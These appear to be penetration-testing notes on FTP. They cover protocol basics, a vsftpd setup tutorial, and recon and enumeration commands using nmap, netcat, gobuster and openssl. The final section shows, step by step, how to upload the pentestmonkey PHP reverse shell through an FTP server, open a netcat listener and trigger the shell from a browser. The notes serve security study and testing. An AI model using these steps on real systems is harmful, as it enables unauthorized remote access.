
## *__Basic Information__

The **File Transfer Protocol (FTP)** serves as a standard protocol for file transfer across a computer network between a server and a client. It is a **plain-text** protocol that uses as **new line character** `**0x0d 0x0a**` so sometimes you need to **connect using** `**telnet**` or `**nc -C**`.

**Default Port:** 21
```
PORT   STATE SERVICE
21/tcp open  ftp
```

## __*How does the FTP server work?

FTP server facilitates the transfer of files between client and server. You can either upload a file to a server or download a file from the server. A client makes two types of connections with the server, one for giving commands and one for transferring data. The client issues the command to the FTP server on port 21, which is the **command port** for FTP. For transferring data, a **data port** is used. There are two types of connection modes for transferring data:

- **Active mode:** In Active mode, the client opens a port and waits for the server to connect to it to transfer data. The server uses its port 20 to connect to the client for data transfer. Active mode is not set by default in most of the FTP clients because most firewalls block the connections which are initiated from outside, in this case, the connection initiated by our FTP server. To use this, you have to configure your firewall.
- **Passive mode:**  In this, when a client requests a file from the server, the server opens a random port and tells the client to connect to that port. In this case, the connections are initiated by the client and this also solves the firewall issues. Most of the FTP clients use passive mode by default.

## __*Default Configuration__
####  *Step 1: Install FTP server

There are many FTP servers to choose from like ProFTPD, vsftpd, etc. We will be using vsftpd. 

**Features of vsftpd FTP server**

vsftpd has a lot of features that make it a great option as an FTP server. It 

- Supports SSL/TLS integration
- Can jail users into its home directory with a feature called chroot. We will set this up later in this article.
- Can limit bandwidth.
- Supports virtual users
- Supports virtual IP configuration
- Supports IPv6

 Type in the following command to install vsftpd

sudo apt install vsftpd

Now we will check if the vsftpd service is active or not. Type in

sudo systemctl status vsftpd

![](https://media.geeksforgeeks.org/wp-content/uploads/20211217185633/Screenshot20211217185613.png)

You can see under the Active heading that it’s active and running. **systemctl** command is used to manage and check services on Linux. We can also use this command to enable and disable services on Linux. If your vsftpd is not active, then type in

sudo systemctl enable --now vsftpd

The –now flag ensures that enable command affects our service immediately and not after a reboot.

### **Step 2: Configure Firewall**

FTP uses port 20 for active mode, port 21 for commands, and a range of ports for passive mode. We need to open these ports from our firewall. If you do not use any firewall, you can skip this step. Most Linux systems use ufw to manage firewalls, however, some cloud service providers like Microsoft Azure have firewalls outside of the Virtual machine and you have to configure that from their portal. Whatever the case, just open ports 20 and 21 for TCP connections and open a range of ports for passive FTP connections. The range for passive ports depends upon how many concurrent user clients you expect to have. Also, a single client can use multiple ports to transfer multiple files or a large file. We also need to specify our FTP server to use those ports and we will see how to do it later in this tutorial The ports till 1024 are reserved and our passive FTP port range should be higher than that. I’ll open ports from 5000-10000. We will also open port 990 for TLS which we will configure later. Let’s do it for ufw. Type in

sudo ufw allow 20/tcp
sudo ufw allow 21/tcp
sudo ufw allow 990/tcp
sudo ufw allow 5000:10000/tcp

### **Step 3:** Configure Users

The two most common use cases of FTP servers are:

- You want to host a public FTP server and a lot of public users are going to connect to your FTP server to download files.
- You want to upload your files to your Linux server for personal use and you would not have public users.

In the first case, you would need to create an additional user and share its username and password with your clients to access the files. Everything else is the same for the second case.

The basic idea is that the admin user should be able to upload files to any folder of the machine, and the public user should be able to view and download files from a specific directory only. To make this happen, you should have a basic idea of user permissions. The root user has the permission to write files into any folder of the server, and any other user has access to every folder inside their home directory which is **/home/username** , and most of the other directories are not writable by other users. So if you want to upload files to other directories outside of your admin user’s home directory, let’s say **/var/www**, then you would need to change the owner of this directory to your admin user with **chown** command, or change directory modification permissions with **chmod** command. 

Let’s start by creating our public user account. Type in

sudo adduser ftpuser

Enter your password, leave other values empty, and at last, enter Y to save changes.

![](https://media.geeksforgeeks.org/wp-content/uploads/20220111202751/Screenshot20220111202734.png)

- ###### It is highly recommended to install the vsFTPd server on a VM and have a closer look at this configuration.
- #### To complete the configuration https://www.geeksforgeeks.org/how-to-setup-and-configure-an-ftp-server-in-linux-2/

## *__Recon

### Identifying an FTP Server

You can use `Nmap` to check if there's an FTP server on a target host like this:

```
nmap -p 21 X.X.X.X
```

### Banner Grabbing

You can use `Netcat` to find out what service is running and its version by looking at the welcome message it shows when you connect. This method is called Banner Grabbing.

```
nc -nv X.X.X.X 21
```

# __*Enumeration

### FTP Server Features
**Nmap script enumeration

```
nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp
```

Using the `nmap` script `ftp-features`, you can enumerate the features supported by the FTP server:

```
nmap -p 21 --script ftp-features <target-ip>
```

This script tests for features listed by the `FEAT` command, providing insight into the server's capabilities.

### Enumerating Default and Common Directories

Many FTP servers have default or common directories that may contain sensitive information. To check for these directories, tools like Dirbuster or gobuster can be used:

```
gobuster dir -u ftp://<target-ip> -w <wordlist-path>
```

### Banner Grabbing

```
nc -vn <IP> 21
openssl s_client -connect crossfit.htb:21 -starttls ftp #Get certificate if any

exmple

openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

# # **explain the commnad
### Command Breakdown

`openssl s_client -connect crossfit.htb:21 -starttls ftp`

This command uses OpenSSL, a cryptography library and toolkit, to perform an SSL/TLS client operation. Let's examine each part:

1. `openssl`: This is the base command for invoking OpenSSL tools.

2. `s_client`: This specifies the "SSL client" tool within OpenSSL. It's used to establish a secure connection using SSL/TLS protocols.

3. `-connect crossfit.htb:21`:
    - `-connect` specifies the server to connect to.
    - `crossfit.htb` is the hostname (domain name) of the target server.
    - `:21` is the port number. In this case, it's port 21, which is typically used for FTP (File Transfer Protocol).

4. `-starttls ftp`:
    - `-starttls` initiates a startTLS command on the specified protocol.
    - `ftp` specifies that FTP should be used as the protocol for the startTLS command.

### Key Points

- This command attempts to establish an SSL/TLS connection on port 21 (typically used for FTP) with the server crossfit.htb.
- The `-starttls ftp` option indicates that the client expects to upgrade an existing FTP connection to use SSL/TLS.
- This command can be useful for testing SSL/TLS support on non-standard ports or for identifying potential misconfigurations where SSL/TLS is incorrectly implemented.

### Purpose

The main purpose of this command appears to be:

1. To check if the server at crossfit.htb supports SSL/TLS on port 21.
2. To verify if the server correctly implements the startTLS protocol for upgrading an FTP connection to secure one.

### Best Practices

When using such commands for security testing:

- Always ensure you have permission before scanning or connecting to external servers.
- Be aware that some systems might block these types of connections as potential security threats.
- Interpret the output carefully, as it may provide insights into the server's configuration and security posture.

Remember, while this command can be part of security testing, it should only be used responsibly and ethically.
### **Common FTP Commands

|Command|Description|Usage|
|---|---|---|
|`lcd`|Change local directory.|`lcd /path/to/directory`|
|`cd`|Change server directory.|`cd /path/to/directory`|
|`ls`|List server directory files.|`ls`|
|`get`|Download file from server.|`get filename.txt`|
|`mget`|Download multiple files.|`mget *.txt`|
|`put`|Upload file to server.|`put filename.txt`|
|`mput`|Upload multiple files.|`mput *.txt`|
|`bin`|Set binary transfer mode.|`bin`|
|`ascii`|Set ASCII transfer mode.|`ascii`|
|`quit`|Exit FTP client.|`quit`|

### __*Download All Files

You can download all files hosted on the FTP service with the following command:

```
wget -m ftp://anonymous:anonymous@X.X.X.X
```

### **Reverse Shell over Website

If the target allows users to access the FTP directory over the web and the web server can run PHP files, you can install the exploit for the reverse shell and gain access.

1. Download the payload

```
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
```

2. Edit some variables in shell.php

```
$ip = '<your-local-ip>';$port = 1234;
```

3. Connect to the FTP server and upload the payload.

```
ftp <target-ip># Upload the payload you downloadedftp> put shell.php
```

4. Get a shell

Firstly, you need to open a listener on your local machine.

```
nc -lvnp 1234
```

Then, in a web browser, navigate to "[http://target.com/path/to/ftp/shell.php](http://target.com/path/to/ftp/shell.php)". This should trigger the exploit and establish a connection back to your listener, providing you with a shell on the target system.